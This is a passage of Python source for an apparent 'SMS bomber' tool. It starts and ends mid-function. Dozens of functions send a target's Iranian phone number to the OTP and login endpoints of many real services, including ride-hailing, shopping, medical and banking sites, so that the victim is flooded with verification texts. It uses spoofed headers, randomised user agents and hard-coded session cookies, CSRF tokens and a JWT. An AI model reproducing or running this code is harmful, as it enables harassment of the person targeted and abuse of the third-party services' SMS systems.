                    print_bomb(f'{g}(BimitoVip) {w}Code Was Sent')
                    return True
            except: print_bomb(f'er')
        def seebirani(phone):
            liJ = {
            "username": "0"+phone.split('+98')[1]
        }
            liU = "https://sandbox.sibirani.ir/api/v1/user/invite"
            liH = {'accept': 'application/json',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json',
        'origin': 'https://developer.sibirani.com',
        'referer': 'https://developer.sibirani.com/',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33'}
            try:
                post(timeout=5, url=liU, headers=liH, json=liJ)
                print_bomb(f'{g}(SeebIrani) {w}Code Was Sent')
                return True
            except: print_bomb(f'er')
        def mihanpezeshk(phone):
            gaD = f'_token=bBSxMx7ifcypKJuE8qQEhahIKpcVApWdfZXFkL8R&mobile={"0"+phone}&recaptcha='
            gaU = 'https://www.mihanpezeshk.com/ConfirmCodeSbm_Patient'
            gaH = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'cookie': 'XSRF-TOKEN=eyJpdiI6IitzYVZRQzFLdGlKNHRHRjIxb3R4VWc9PSIsInZhbHVlIjoianR6SXBJXC9rUStMRCs0ajUzalNjM1pMN053bUNtSlJ5dzYrVzFxV1dtXC9SREp4OTJ0Wm1RWW9yRVwvM29Cc3l4SCIsIm1hYyI6IjdjODczZWI4Y2Q2N2NhODVkNjE5YTRkOWVhNjRhNDRlNmViZjhlNDVkNDYwODFkNzViOTU2ZTdjYTUwZjhjMWUifQ%3D%3D; laravel_session=eyJpdiI6ImU3dlpRdXV1XC9TMmJEWk1LMkFTZGJRPT0iLCJ2YWx1ZSI6IktHTWF0bFlJU0VqVCthamp5aW1GRHdBM1lNcjNMcVFxMWM5Ynd3clZLQzdva2ZJWXRiRU4xaUhyMnVHMG90RkUiLCJtYWMiOiJkZWRmMGM5YzFiNDNiOTJjYWFiZDc0MjYxMDUyMzBmYTMzMmI5ZTBkODA1YTMxODQyYzM2NjVjZWExZmYwMzdhIn0%3D',
        'origin': 'https://www.mihanpezeshk.com',
        'referer': 'https://www.mihanpezeshk.com/confirmcodePatient',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'}
            try:
                gaR = post(url=gaU, headers=gaH, data=gaD)
                print_bomb(f'{g}(MihanPezeshk) {w}Code Was Sent')
                return True
            except: print_bomb(f'er')
        def mek(phone):
            meU = 'https://www.hamrah-mechanic.com/api/v1/auth/login'
            meH = {
        "Accept": "application/json",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive",
        "Content-Type": "application/json",
        "Cookie": "_ga=GA1.2.1307952465.1641249170; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_token=2527d893-9de1-8fee-9f73-d666992dd3d5; _yngt=9d6ba2d2-fd1c-4dcc-9f77-e1e364af4434; _hjSessionUser_619539=eyJpZCI6IjcyOTJiODRhLTA2NGUtNTA0Zi04Y2RjLTA2MWE3ZDgxZDgzOSIsImNyZWF0ZWQiOjE2NDEyNDkxNzEzMTUsImV4aXN0aW5nIjp0cnVlfQ==; _gid=GA1.2.284804399.1642278349; _gat_gtag_UA_106934660_1=1; _gat_UA-0000000-1=1; analytics_session_token=238e3f23-aff7-8e3a-f1d4-ef4f6c471e2b; yektanet_session_last_activity=1/15/2022; _yngt_iframe=1; _gat_UA-106934660-1=1; _hjIncludedInSessionSample=0; _hjSession_619539=eyJpZCI6IjRkY2U2ODUwLTQzZjktNGM0Zi1iMWUxLTllY2QzODA3ODhiZCIsImNyZWF0ZWQiOjE2NDIyNzgzNTYzNjgsImluU2FtcGxlIjpmYWxzZX0=; _hjIncludedInPageviewSample=1; _hjAbsoluteSessionInProgress=0",
        "Host": "www.hamrah-mechanic.com",
        "Origin": "https://www.hamrah-mechanic.com",
        "Referer": "https://www.hamrah-mechanic.com/membersignin/",
        "Source": "web",
        "TE": "trailers",
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0"
        }
            meD = {
            "landingPageUrl": "https://www.hamrah-mechanic.com/",
            "orderPageUrl": "https://www.hamrah-mechanic.com/membersignin/",
            "phoneNumber": "0"+phone,
            "prevDomainUrl": None,
            "prevUrl": None,
            "referrer": "https://www.google.com/"
        }
            try:
                meR = post(url=meU, headers=meH, data=meD).json()
                if meR['isSuccess']:
                    print_bomb(f'{g}(HamrahMechanic) {w}Code Was Sent')
                    return True
            except: print_bomb(f'er')
        
        def snapp(phone):
            print_bomb('hierwh')
            post(url="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",json={"cellphone": "+98"+phone}, headers={"Host": "app.snapp.taxi", "content-length": "29", "x-app-name": "passenger-pwa", "x-app-version": "5.0.0", "app-version": "pwa", "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36", "content-type": "application/json", "accept": "*/*", "origin": "https://app.snapp.taxi", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://app.snapp.taxi/login/?redirect_to\u003d%2F", "accept-encoding": "gzip, deflate, br", "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6", "cookie": "_gat\u003d1"},)

        def tapsi(phone):
            print_bomb('hierwh')
            post(url="https://tap33.me/api/v2/user", json={"credential":{"phoneNumber":f'0{phone}',"role":"PASSENGER"}},)

        def torob(phone):
            print_bomb('hierwh')
            get(url=f'https://api.torob.com/a/phone/send-pin/?phone_number=0{phone}',headers={"Host": "api.torob.com","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","accept": "*/*","origin": "https://torob.com","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://torob.com/user/","accept-encoding": "gzip, deflate, br","accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6","cookie": "amplitude_id_95d1eb61107c6d4a0a5c555e4ee4bfbbtorob.com\u003deyJkZXZpY2VJZCI6ImFiOGNiOTUyLTk1MTgtNDhhNS1iNmRjLTkwZjgxZTFjYmM3ZVIiLCJ1c2VySWQiOm51bGwsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTU5Njg2OTI4ODM1MSwibGFzdEV2ZW50VGltZSI6MTU5Njg2OTI4ODM3NCwiZXZlbnRJZCI6MSwiaWRlbnRpZnlJZCI6Miwic2VxdWVuY2VOdW1iZXIiOjN9"},)

        def alibaba(phone):
            print_bomb('hierwh')
            post(url="https://ws.alibaba.ir/api/v3/account/mobile/otp",json={"phoneNumber":f'0{phone}'},)
            

        def snapmarket(phone):
            print_bomb('hierwh')
            post(url="https://account.api.balad.ir/api/web/auth/login/",json={"phone_number": f'0{phone}',"os_type": "W"},)

        def miareh(phone):
            print_bomb('hierwh')
            get(url=f'https://www.miare.ir/p/restaurant/#/login?phone=0{phone}',)

        def ostadkar(phone): post(url="https://api.ostadkr.com/login",json={"mobile": f'0{phone}'},)

        def drnext(phone):post(url="https://cyclops.drnext.ir/v1/patients/auth/send-verification-token", json={"source": "besina","mobile": f'0{phone}'}, )

        def behtarino(phone):        
            post(url="https://bck.behtarino.com/api/v1/users/jwt_phone_verification/", json={"phone": f'0{phone}'},)

        def behtarino(phone):post(url="https://bck.behtarino.com/api/v1/users/jwt_phone_verification/", json={"phone": f'0{phone}'})

        def bit24(phone):
            print_bomb('hierwh')
            post(url='https://bit24.cash/auth/bit24/api/v3/auth/check-mobile',json={"mobile": f'0{phone}',"contry_code": "98"})             

        def drdr(phone):
            print_bomb('hierwh')
            post(url="https://drdr.ir/api/v3/auth/login/mobile/init",json={"mobile": phone})

        def drto(phone):
            print_bomb('hierwh')
            get("https://api.doctoreto.com/api/web/patient/v1/accounts/register",json={    "mobile": phone,    "captcha": "",    "country_id": 205})

        def okala(phone):
            print_bomb('hierwh')
            post(url="https://api-react.okala.com/C/CustomerAccount/OTPRegister",json={"mobile": f'0{phone}',        "deviceTypeCode": 0, "confirmTerms": True, "notRobot": False},)    

        def banimod(phone):
            print_bomb('hierwh')
            post(url="https://mobapi.banimode.com/api/v2/auth/request",json={"phone": f'0{phone}' })

        def beroozmarket(phone):
            print_bomb('hierwh')
            post(url="https://api.beroozmart.com/api/pub/account/send-otp",json={"mobile": f'0{phone}', "sendViaSms": True, "email": "null", "sendViaEmail": False},)

        def itoll(phone):
            print_bomb('hierwh')
            post(url="https://app.itoll.com/api/v1/auth/login",json={"mobile": f'0{phone}'})

        def gap(phone):
            print_bomb('hierwh')
            get(url=f'https://core.gap.im/v1/user/add.json?mobile=%2B98{phone}')

        def pinket(phone):
            print_bomb('hierwh')
            post(url="https://pinket.com/api/cu/v2/phone-verification",json={"phoneNumber": f'0{phone}'})
            

        def football360(phone):
            print_bomb('hierwh')
            post(url="https://football360.ir/api/auth/verify-phone/",json={"phone_number": "+98"+phone})

        def pinorest(phone):
            print_bomb('hierwh')
            post(url="https://api.pinorest.com/frontend/auth/login/mobile",json={"mobile": f'{phone}'})

        def mrbilit(phone):
            print_bomb('hierwh')
            get(url=f'https://auth.mrbilit.com/api/login/exists/v2?mobileOrEmail=0{phone}&source=2&sendTokenIfNot=true')

        def hamrahmechanich(phone):
            print_bomb('hierwh')
            post(url="https://www.hamrah-mechanic.com/api/v1/membership/otp",json={"PhoneNumber":f'0{phone}',"prevDomainUrl":"https://www.google.com/","landingPageUrl":"https://www.hamrah-mechanic.com/cars-for-sale/","orderPageUrl":"https://www.hamrah-mechanic.com/membersignin/","prevUrl":"https://www.hamrah-mechanic.com/cars-for-sale/","referrer":"https://www.google.com/"},)

        def lendo(phone):
            print_bomb('hierwh')
            post(url="https://api.lendo.ir/api/customer/auth/send-otp",json={ "mobile": f'0{phone}'},)

        def taghche(phone):
            print_bomb('hierwh')
            post(url="https://gw.taaghche.com/v4/site/auth/login",json={"contact": f'0{phone}', "forceOtp": False},)

        def fidibo(phone):
            print_bomb('hierwh')
            post("https://fidibo.com/user/login-by-sms", f'mobile_number={phone}&country_code=ir&K1YwQTI0V2xtb3lZNGw0TDhDZm1SUT09=c0tjS0ViOTE2b5F1eE9MRjdLWEhodz09',)
            
        def khodro45(phone):
            print_bomb('hierwh')
            post(url="https://khodro45.com/api/v1/customers/otp/", json={"mobile": f'0{phone}'},)

        def pateh(phone):
            print_bomb('hierwh')
            post(url="https://api.pateh.com/api/v1/LoginOrRegister",    json={"mobile": f'0{phone}'}    ,    headers={
            "authority": "api.pateh.com",
            "method": "POST",
            "path": "/api/v1/LoginOrRegister",
            "scheme": "https",
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9,fa;q=0.8",
            "Content-Length": "24",
            "Content-Type": "application/json;charset=UTF-8",
            "Origin": "https://www.pateh.com",
            "Referer": "https://www.pateh.com/",
            "Sec-Ch-Ua": '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": "Windows",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "User-Agent":
            generate_user_agent(os="win")})    

        def ketabchi(phone):
            print_bomb('hierwh')
            post(url="https://ketabchi.com/api/v1/auth/requestVerificationCode",json={"auth": {"phoneNumber": f'0{phone}'}},)

        def reyanertebet(phone):
            print_bomb('hierwh')
            post(url="https://pay.rayanertebat.ir/api/User/Otp?t=1692088339811",json={"mobileNo": f'0{phone}'},)

        def bimito(phone):
            print_bomb('hierwh')
            post(url="https://bimito.com/api/vehicleorder/v2/app/auth/login-with-verify-code",json={"phoneNumber": f'0{phone}', "isResend": False},)

        def pindo(phone):
            print_bomb('hierwh')
            post(url="https://api.pindo.ir/v1/user/login-register/",json={"phone": f'0{phone}'},)

        def delino(phone):
            print_bomb('hierwh')
            post(url="https://www.delino.com/user/register",json={ "mobile": f'0{phone}'},)

        def zoodex(phone):
            print_bomb('hierwh')
            post(url="https://admin.zoodex.ir/api/v1/login/check",json={"mobile": f'0{phone}'},)

        def kukala(phone):
            print_bomb('hierwh')
            post(url="https://api.kukala.ir/api/user/Otp", json={"phoneNumber": f'0{phone}'},)

        def baskol(phone):
            print_bomb('hierwh')
            post(url="https://www.buskool.com/send_verification_code",json={"phone": f'0{phone}'},)

        def threetex(phone):
            print_bomb('hierwh')
            post(url="https://3tex.io/api/1/users/validation/mobile",json={"receptorPhone": f'0{phone}'},)

        def deniizshop(phone):
            print_bomb('hierwh')
            post(url="https://deniizshop.com/api/v1/sessions/login_request",json={"mobile_number": f'0{phone}'},)

        def flightio(phone):
            print_bomb('hierwh')
            post(url="https://flightio.com/bff/Authentication/CheckUserKey",json={"userKey": f'0{phone}'},)

        def abantether(phone):
            print_bomb('hierwh')
            post(url="https://abantether.com/users/register/phone/send/",json={"phoneNumber": f'0{phone}'},)

        def pooleno(phone):
            print_bomb('hierwh')
            post(url="https://api.pooleno.ir/v1/auth/check-mobile",json={"mobile": f'0{phone}'},)

        def wideapp(phone):
            print_bomb('hierwh')
            post(url="https://agent.wide-app.ir/auth/token",json={"grant_type": "otp", "client_id": "62b30c4af53e3b0cf100a4a0", "phone": f'0{phone}'},)

        def iranlms(phone):
            print_bomb('hierwh')
            post(url="https://messengerg2c4.iranlms.ir/",json={"se": f'0{phone}'},)

        def classino(phone):
            print_bomb('hierwh')
            post(url="https://nx.classino.com/otp/v1/api/login",json={"mobile": f'0{phone}'},)

        def snappfood(phone):
            print_bomb('hierwh')
            post(url="https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&sms_apialClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.0&UDID=39c62f64-3d2d-4954-9033-816098559ae4&locale=fa",json={"cellphone": f'0{phone}'},)

        def bitbarg(phone):
            print_bomb('hierwh')
            post(url="https://api.bitbarg.com/api/v1/authentication/registerOrLogin",json={"phone": f'0{phone}'},)

        def bahramshop(phone):
            print_bomb('hierwh')
            post(url="https://api.bahramshop.ir/api/user/validate/username",json={"username": f'0{phone}'},)

        def tak(phone):
            print_bomb('hierwh')
            post(url="https://takshopaccessorise.ir/api/v1/sessions/login_request",json={"mobile_phone": f'0{phone}'},)

        def chamedon(phone):
            print_bomb('hierwh')
            post(url="https://chamedoon.com/api/v1/membership/guest/request_mobile_verification",json={"mobile": f'0{phone}'},)

        def kilid(phone):
            print_bomb('hierwh')
            post(url="https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL",json={"mobile": f'0{phone}'},)

        def otaghak(phone):
            print_bomb('hierwh')
            post(url="https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode",json={"userName": f'0{phone}'},)

        def shab(phone):
            print_bomb('hierwh')
            post(url="https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile",json={"mobile": f'0{phone}'},)
            
        def raybit(phone):
            print_bomb('hierwh')
            post(url="https://api.raybit.net:3111/api/v1/authentication/register/mobile",json={"mobile": f'0{phone}'},)

        def farvi(phone):
            print_bomb('hierwh')
            post(url="https://farvi.shop/api/v1/sessions/login_request",json={"mobile_phone": f'0{phone}'},)    

        def namava(phone):
            print_bomb('hierwh')
            post(url="https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",json={"UserName": f'0{phone}'},)

        def a4baz(phone):
            print_bomb('hierwh')
            post(url="https://a4baz.com/api/web/login",json={"cellphone": f'0{phone}'},)

        def anargift(phone):
            print_bomb('hierwh')
            post(url="https://api.anargift.com/api/people/auth",json={"user": f'0{phone}'},)

        def nobat(phone):
            print_bomb('hierwh')
            post(url="https://nobat.ir/api/public/patient/login/phone",json={"mobile": f'0{phone}'},)

        def ayantech(phone):
            print_bomb('hierwh')
            post(url="https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode",json={"Parametrs": {"ApplicationType": "Web","ApplicationUniqueToken": None, "ApplicationVersion": "1.0.0","MobileNumber": f'0{phone}' }},)

        def simkhan(phone):
            print_bomb('hierwh')
            post(url="https://www.simkhanapi.ir/api/users/registerV2",json={"mobileNumber": f'0{phone}'},)

        def sibirani(phone):
            print_bomb('hierwh')
            post(url="https://sandbox.sibirani.ir/api/v1/user/invite",json={"username": f'0{phone}'},)

        def hyperjan(phone):
            print_bomb('hierwh')
            post(url="https://shop.hyperjan.ir/api/users/manage",json={"mobile": f'0{phone}'},)

        def digikala(phone):
            print_bomb('hierwh')
            post(url="https://api.digikala.com/v1/user/authenticate/",json={"username": f'0{phone}'},)

        def hiword(phone):
            print_bomb('hierwh')
            post(url="https://hiword.ir/wp-json/otp-login/v1/login",json={"identifier": f'0{phone}'},)

        def tikban(phone):
            print_bomb('hierwh')
            post(url="https://tikban.com/Account/LoginAndRegister",json={"cellPhone": f'0{phone}'},)

        def dicardo(phone):
            print_bomb('hierwh')
            post(url="https://dicardo.com/main/sendsms",json={"phone": f'0{phone}'},)

        def digistyle(phone):
            print_bomb('hierwh')
            post(url="https://www.digistyle.com/users/login-register/",json={"loginRegister[email_phone]": f'0{phone}'},)

        def banankala(phone):
            print_bomb('hierwh')
            post(url="https://banankala.com/home/login",json={"Mobile": f'0{phone}'},)

        def offdecor(phone):
            print_bomb('hierwh')
            post(url="https://www.offdecor.com/index.php?route=account/login/sendCode",json={"phone": f'0{phone}'},)

        def exo(phone):
            print_bomb('hierwh')
            post(url="https://exo.ir/index.php?route=account/mobile_login",json={"mobile_number": f'0{phone}'},)

        def shahrefarsh(phone):
            print_bomb('hierwh')
            post(url="https://shahrfarsh.com/Account/Login",json={"phoneNumber": f'0{phone}'},)

        def beheshticarpet(phone):
            print_bomb('hierwh')
            post(url="https://takfarsh.com/wp-content/themes/bakala/template-parts/send.php",json={"phone_email": f'0{phone}'},)

        def khanomi(phone):
            print_bomb('hierwh')
            post(url="https://www.khanoumi.com/accounts/sendotp",json={"mobile": f'0{phone}'},)

        def rojashop(phone):
            print_bomb('hierwh')
            post(url="https://rojashop.com/api/auth/sendOtp",json={"mobile": f'0{phone}'},)

        def dadpardaz(phone):
            print_bomb('hierwh')
            post(url="https://dadpardaz.com/advice/getLoginConfirmationCode",json={"mobile": f'0{phone}'},)

        def rokla(phone):
            print_bomb('hierwh')
            post(url="https://api.rokla.ir/api/request/otp",json={"mobile": f'0{phone}'},)

        def khodro45(phone):
            print_bomb('hierwh')
            post(url="https://khodro45.com/api/v1/customers/otp/",json={"mobile": f'0{phone}'},)

        def pezeshket(phone):
            print_bomb('hierwh')
            post(url="https://api.pezeshket.com/core/v1/auth/requestCode",json={"mobileNumber": f'0{phone}'},)

        def virgool(phone):
            print_bomb('hierwh')
            post(url="https://virgool.io/api/v1.4/auth/verify",json={"method": "phone", "identifier": f'0{phone}'},)

        def timcheh(phone):
            print_bomb('hierwh')
            post(url="https://api.timcheh.com/auth/otp/send",json={"mobile": f'0{phone}'},)

        def paklean(phone):
            print_bomb('hierwh')
            post(url="https://client.api.paklean.com/user/resendCode",json={"username": f'0{phone}'},)

        def daal(phone):
            print_bomb('hierwh')
            post(url="https://daal.co/api/authentication/login-register/method/phone-otp/user-role/customer/verify-request",headers={ "Accept": "application/json",},json={ "phone": f"0{phone}"})

        def bimebazar(phone):
            print_bomb('hierwh')
            post(url="https://bimebazar.com/accounts/api/login_sec/",json={ "username": f"0{phone}"},)

        def azki(phone):
            print_bomb('hierwh')
            post(url="https://www.azki.co/api/vehicleorder/v2/app/auth/check-login-availability/",json={"phoneNumber": f"0{phone}"},)

        def safarmarket(phone):
            print_bomb('hierwh')
            post(url="https://safarmarket.com//api/security/v2/user/otp",json={"phone": f"0{phone}"},)

        def shad(phone):
            print_bomb('hierwh')
            shadH = {"Host": "shadmessenger12.iranlms.ir", "content-length": "96", "accept": "application/json, text/plain, */*", "user-agent":
            generate_user_agent(os="android"), "content-type": "text/plain","origin": "https://shadweb.iranlms.ir", "sec-fetch-site": "same-site", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://shadweb.iranlms.ir/", "accept-encoding": "gzip, deflate, br", "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
            shadD = {"api_version": "3", "method": "sendCode", "data": {"phone_number": "098"+phone, "send_type": "SMS"}}
            post(url="https://shadmessenger12.iranlms.ir/", headers=shadH, json=shadD)

        def emtiaz(phone):
            print_bomb('hierwh')
            emH = {"Host": "web.emtiyaz.app", "Connection": "keep-alive", "Content-Length": "28", "Cache-Control": "max-age\u003d0", "Upgrade-Insecure-Requests": "1", "Origin": "https://web.emtiyaz.app", "Content-Type": "application/x-www-form-urlencoded", "User-Agent":
            generate_user_agent(os="android"), "Accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://web.emtiyaz.app/login", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6", "Cookie": "__cfduid\u003dd3744e2448268f90a1ea5a4016884f7331596404726; __auc\u003dd86ede5a173b122fb752f98d012; _ga\u003dGA1.2.719537155.1596404727; __asc\u003d7857da15173c7c2e3123fd4c586; _gid\u003dGA1.2.941061447.1596784306; _gat_gtag_UA_124185794_1\u003d1"}
            emD = "send=1&cellphone=0"+phone
            post(url="https://web.emtiyaz.app/json/login", headers=emH, data=emD)

        def azinja(phone):
            print_bomb('hierwh')
            n4 = "------WebKitFormBoundarycIO8Y5lNAbbiVXKS\r\nContent-Disposition: form-data; name=\"mobile\"\r\n\r\n0"+phone+"\r\n------WebKitFormBoundarycIO8Y5lNAbbiVXKS--\r\n"
            rhead = {"Host": "arzinja.app","content-type": "multipart/form-data; boundary=----WebKitFormBoundarycIO8Y5lNAbbiVXKS","sec-ch-ua": "\"Chromium\";v=\"110\", \"Not A(Brand\";v=\"24\", \"Google Chrome\";v=\"110\"","accept": "application/json, text/plain, */*","sec-ch-ua-mobile": "?1","user-agent":
            generate_user_agent(os="android"),"sec-ch-ua-platform": "Android","origin": "https://arzinja.info","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://arzinja.info/","accept-encoding": "gzip, deflate, br","accept-language": "fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7"}
            post(url="https://arzinja.app/api/login",data=n4, headers=rhead)

        def rubika(phone):
            print_bomb('hierwh')
            ruH = {"Host": "messengerg2c4.iranlms.ir", "content-length": "96", "accept": "application/json, text/plain, */*", "user-agent":
            generate_user_agent(os="android"), "content-type": "text/plain","origin": "https://web.rubika.ir", "sec-fetch-site": "cross-site", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://web.rubika.ir/", "accept-encoding": "gzip, deflate, br", "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
            ruD = {"api_version": "3", "method": "sendCode", "data": {"phone_number": phone, "send_type": "SMS"}}
            post(url="https://messengerg2c4.iranlms.ir/", headers=ruH, json=ruD)

        def bama(phone):
            print_bomb('hierwh')
            bamaH = {"Host": "bama.ir", "content-length": "22", "accept": "application/json, text/javascript, */*; q\u003d0.01", "x-requested-with": "XMLHttpRequest", "user-agent":
            generate_user_agent(os="android"), "csrf-token-bama-header": "CfDJ8N00ikLDmFVBoTe5ae5U4a2G6aNtBFk_sA0DBuQq8RmtGVSLQEq3CXeJmb0ervkK5xY2355oMxH2UDv5oU05FCu56FVkLdgE6RbDs1ojMo90XlbiGYT9XaIKz7YkZg-8vJSuc7f3PR3VKjvuu1fEIOE", "content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8", "origin": "https://bama.ir", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://bama.ir/Signin?ReturnUrl\u003d%2Fprofile", "accept-encoding": "gzip, deflate, br", "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6", "cookie": "CSRF-TOKEN-BAMA-COOKIE\u003dCfDJ8N00ikLDmFVBoTe5ae5U4a1o5aOrFp-FIHLs7P3VvLI7yo6xSdyY3sJ5GByfUKfTPuEgfioiGxRQo4G4JzBin1ky5-fvZ1uKkrb_IyaPXs1d0bloIEVe1VahdjTQNJpXQvFyt0tlZnSAZFs4eF3agKg"}
            bamaD = "cellNumber=0"+phone
            post(url="https://bama.ir/signin-checkforcellnumber", headers=bamaH, data=bamaD)

        def digify(phone):
            print_bomb('hierwh')
            n4 = {"operationName":"Mutation","variables":{"content":{"phone_number":"0"+phone}},"query":"mutation Mutation($content: MerchantRegisterOTPSendContent) {\n  merchantRegister {\n    otpSend(content: $content)\n    __typename\n  }\n}"}
            rhead = {"content-type": "application/json","accept": "*/*","sec-ch-ua": "\"Chromium\";v=\"110\", \"Not A(Brand\";v=\"24\", \"Google Chrome\";v=\"110\"","user-agent":
            generate_user_agent(os="android"),"sec-ch-ua-platform": "\"Android\"","origin": "https://register.digify.shop","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://register.digify.shop/","accept-encoding": "gzip, deflate, br","accept-language": "fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7","content-length": "233","host": "apollo.digify.shop"}
            post(url="https://apollo.digify.shop/graphql",json=n4, headers=rhead)

        def snappmarket(phone):
            print_bomb('hierwh')
            smarketU = f'https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0{phone}'
            smarketH = {'referer': 'https://snapp.market/','user-agent':
            generate_user_agent(os="linux")}
            post(url=smarketU, headers=smarketH)

        def chartex(phone):
            print_bomb('hierwh')
            arkaH = {"Host": "api.chartex.net", "User-Agent":
            generate_user_agent(os="win"), "Accept": "application/json, text/plain, */*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Access-Control-Allow-Origin": "*", "Access-Control-Allow-Headers": "Origin, Accept, Content-Type, Authorization, Access-Control-Allow-Origin", "provider-code": "RUBIKA", "Authorization": "JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1OTgwMzU0NDEsImlhdCI6MTU5Nzg2MjY0MSwibmJmIjoxNTk3ODYyNjQxLCJhZCI6MTA2NDIxLCJpZCI6MTA2NDIyLCJyb2xlIjoiR1VFU1QiLCJzZXNzaW9uX2tleSI6ImxvZ2luX3Nlc3Npb25fMTA2NDIxXzEwNjQyMl9JQXdqUkZrTVBMUWhJeG5oSGFlQXdqVHciLCJwYyI6bnVsbCwiYyI6IklSUiJ9.wMAa_fI7VVBal8IhBeM-6wmGK4bDUOEj2fjoKhknyRk", "Cache-Control": "no-cache", "Plugin-version": "3.12.15", "Content-Type": "application/json;charset=utf-8", "Content-Length": "69", "Origin": "https://arkasafar.ir", "Connection": "keep-alive", "Referer": "https://arkasafar.ir/"}
            arkaD = {"mobile": "0" + phone, "country_code": "IR", "provider_code": "RUBIKA"}
            post(url='https://api.chartex.net/api/v2/user/validate', headers=arkaH, json=arkaD)

        def snapptrip(phone):
            print_bomb('hierwh')
            sTripH = {"Host": "www.snapptrip.com", "User-Agent":
            generate_user_agent(os="win"), "Accept": "*/*", "Accept-Language": "fa", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/json; charset=utf-8", "lang": "fa", "X-Requested-With": "XMLHttpRequest", "Content-Length": "134", "Origin": "https://www.snapptrip.com", "Connection": "keep-alive", "Referer": "https://www.snapptrip.com/","Cookie": "route=1597937159.144.57.429702; unique-cookie=KViXnCmpkTwY7rY; appid=g*-**-*; ptpsession=g--196189383312301530; _ga=GA1.2.118271034.1597937174; _ga_G8HW6QM8FZ=GS1.1.1597937169.1.0.1597937169.60; _gid=GA1.2.561928072.1597937182; _gat_UA-107687430-1=1; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_session_token=445b5d83-abeb-7ffd-091e-ea1ce5cfcb52; analytics_token=2809eef3-a3cf-7b9c-4191-8d8be8e5c6b7; yektanet_session_last_activity=8/20/2020; _hjid=b1148e0d-8d4b-4a3d-9934-0ac78569f4ea; _hjAbsoluteSessionInProgress=0; MEDIAAD_USER_ID=6648f107-1407-4c83-97a1-d39c9ec8ccad", "TE": "Trailers"}
            sTripD = {"lang": "fa", "country_id": "860", "password": "snaptrippass", "mobile_phone": "0" + phone, "country_code": "+98", "email": "example@gmail.com"}
            post(url='https://www.snapptrip.com/register',  headers=sTripH, json=sTripD)

        def okcs(phone):
            print_bomb('hierwh')
            rhead = {"user-agent":
